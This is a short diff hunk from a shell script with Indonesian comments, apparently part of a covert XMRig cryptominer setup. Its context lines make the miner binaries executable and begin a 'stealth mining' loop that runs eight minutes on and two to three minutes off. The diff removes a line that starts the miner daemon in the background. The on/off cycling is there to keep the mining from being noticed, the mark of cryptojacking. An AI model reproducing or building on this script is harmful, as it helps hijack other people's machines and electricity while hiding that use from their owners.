@@ -135,8 +135,6 @@ END
 # Beri hak akses
 chmod +x config.json xmrigDaemon xmrigMiner
 
-# Jalankan daemon di background
-./xmrigDaemon &
 
 # Loop stealth mining: 8 menit ON, 2-3 menit OFF
 while true; do
